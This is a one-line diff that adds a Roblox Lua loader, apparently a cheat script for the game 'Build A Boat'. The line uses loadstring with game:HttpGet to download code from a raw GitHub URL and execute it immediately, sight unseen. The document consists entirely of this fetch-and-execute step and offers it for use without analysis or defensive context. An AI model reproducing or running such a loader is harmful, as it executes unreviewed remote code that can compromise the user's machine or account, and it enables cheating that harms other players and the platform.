@@ -1,0 +1,1 @@
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/Crimson-gith/BuildABoat/main/Build%20A%20Boat'), true))()
